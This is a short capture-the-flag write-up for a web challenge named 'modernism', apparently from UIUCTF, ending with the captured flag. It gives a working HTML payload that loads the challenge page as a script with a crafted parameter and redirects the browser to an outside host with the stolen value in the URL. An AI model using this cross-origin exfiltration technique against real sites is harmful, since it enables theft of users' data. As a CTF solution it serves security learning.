# modernism

I prefixed `class ` so you get `class uiuctf{FLAG}` and then got the parameter out.

```html
<!DOCTYPE html>
<body>
    <script src="https://modernism-web.chal.uiuc.tf/?p=636c61737320"></script>
    <script>
        window.onload = () => {
            document.location = 'https://seraphin.xyz/?q='+uiuctf.toString();
        }
    </script>
</body>

```

uiuctf{IqMDsheILiVLOcCOlllJdvjadLrmCjvFEQ}
